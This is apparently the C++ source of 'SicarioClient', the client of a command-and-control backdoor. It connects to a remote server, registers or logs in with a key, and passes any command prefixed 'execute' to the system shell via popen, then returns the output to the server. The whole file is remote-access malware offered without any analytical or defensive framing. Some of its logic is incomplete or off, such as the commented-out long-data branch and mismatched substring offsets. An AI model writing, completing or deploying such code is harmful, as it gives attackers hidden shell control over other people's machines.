#include "sicarioClient.h"

SicarioClient::SicarioClient(std::string serverAddress, short port) {
    conn = socket(AF_INET, SOCK_STREAM, 0);
    memset(&connAddress, 0, sizeof(connAddress));
    connAddress.sin_family = AF_INET;
    connAddress.sin_port = htons(port);
    inet_pton(AF_INET,serverAddress.c_str(),&connAddress.sin_addr);
    connect(conn, (struct sockaddr*)&connAddress, sizeof(connAddress));

    connInterval=60;
}

SicarioClient::~SicarioClient() {
    close(conn);
}

void SicarioClient::disconnect() {
    close(conn);
}

void SicarioClient::reconnect() {
    connect(conn, (struct sockaddr*)&connAddress, sizeof(connAddress));
}

void SicarioClient::sendPacket(std::string data) {
    send(conn,data.c_str(),data.length(),0);
}

std::string SicarioClient::receivePacket() {
    char buffer[2048] = {0};
    recv(conn,buffer,sizeof(buffer),0);
    return std::string(buffer);
}

void SicarioClient::sendData(std::string data) {
    if(data.length() <= 2042) {
        sendPacket("SC00(" + data + ")");
    } else {
        //for(short i=ceil(data.length() / 2042); i >= 0; i--)
    }
}

std::string SicarioClient::receiveData() {
    std::string data = receivePacket();
    if(data.length() == 0)
        return "";
    if(data.substr(0,4) == "SC00")
        return data.substr(3,data.length()-4);
    else {
        return data.substr(3,data.length()-4) + receiveData();
    }
}

std::string SicarioClient::registerUser(){
    sendData("register");
    std::string userKey = receiveData();
    userKey = userKey.substr(10,userKey.length());
    this->userKey = userKey;
    return userKey;
}

void SicarioClient::loginUser(std::string userKey) {
    sendData("login " + userKey);
    this->userKey = userKey;
}

// WARNING: Only non-header commands!
std::string SicarioClient::interpretCommand(std::string command) {
    if(command.substr(0,7) == "execute") {
        return executeCommand(command.substr(7,command.length()));
    } else {
        this->errorQueue.push(SIC_INVALID_COMMAND);
        return "";
    }
}

std::string executeCommand(std::string cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(cmd.c_str(), "r");
    try {
        while (!feof(pipe)) {
            if (fgets(buffer, 128, pipe) != NULL)
                result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}
